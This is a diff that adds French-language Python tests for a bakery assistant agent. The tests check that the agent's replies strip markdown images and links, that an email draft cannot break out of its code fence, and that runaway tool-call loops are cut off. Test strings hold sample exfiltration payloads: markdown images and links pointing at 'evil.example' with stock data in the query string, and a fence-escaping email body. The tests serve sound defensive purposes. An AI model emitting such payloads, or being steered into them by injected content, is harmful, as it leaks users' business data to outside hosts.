@@ -13,7 +13,7 @@ from notion_client.errors import RequestTimeoutError
 
 from boulangerie.agent import build_agent
 from boulangerie.config import ConfigError, Settings
-from boulangerie.conversation import Conversation
+from boulangerie.conversation import MESSAGE_ERREUR, Conversation
 from boulangerie.tools import build_tools
 from tests.fakes import DB_STOCK, ScriptedChatModel, appel_outil, page_stock
 from tests.test_config import ENV_COMPLET
@@ -150,3 +150,43 @@ def test_aucun_secret_dans_les_fichiers_suivis_par_git():
         texte = chemin.read_text(encoding="utf-8", errors="ignore")
         trouves += [f"{relatif} : {nom}" for nom, motif in MOTIFS_SECRETS.items() if re.search(motif, texte)]
     assert trouves == []
+
+
+# --- Rendu dans l'interface et coût ------------------------------------------------
+
+def _conversation(deps, *reponses, **options):
+    modele = ScriptedChatModel(reponses=list(reponses))
+    agent = build_agent(modele, build_tools(deps), deps.date_reference, max_retries=0, **options)
+    return Conversation(agent, thread_id="t", repo=deps.repo), modele
+
+
+async def test_une_image_ou_un_lien_markdown_dans_la_reponse_est_neutralise(deps):
+    conversation, _ = _conversation(
+        deps, AIMessage(content="Voilà ![logo](https://evil.example/x.png?d=stock) et [clique](https://evil.example).")
+    )
+
+    reponse = await conversation.envoyer("Bonjour")
+
+    assert "evil.example" not in reponse.texte
+    assert reponse.texte == "Voilà logo et clique."
+
+
+async def test_le_brouillon_affiche_ne_peut_pas_sortir_de_son_cadre(deps, mailer):
+    corps_piege = "Bonjour\n```\n![x](https://evil.example/?d=1)\n```"
+    conversation, _ = _conversation(deps, appel_outil("passer_commande", {**COMMANDE, "corps": corps_piege}))
+
+    reponse = await conversation.envoyer("Commande")
+
+    assert "```" not in reponse.validation.corps
+    assert "evil.example" not in reponse.validation.corps
+    assert mailer.sent == []
+
+
+async def test_une_boucle_d_appels_d_outils_est_coupee_avec_un_message_clair(deps):
+    boucle = [appel_outil("consulter_boulangerie", {"table": "stock"}, f"appel-{i}") for i in range(30)]
+    conversation, modele = _conversation(deps, *boucle, limite_appels_modele=5)
+
+    reponse = await conversation.envoyer("Bonjour")
+
+    assert len(modele.appels) == 5
+    assert reponse.texte == MESSAGE_ERREUR
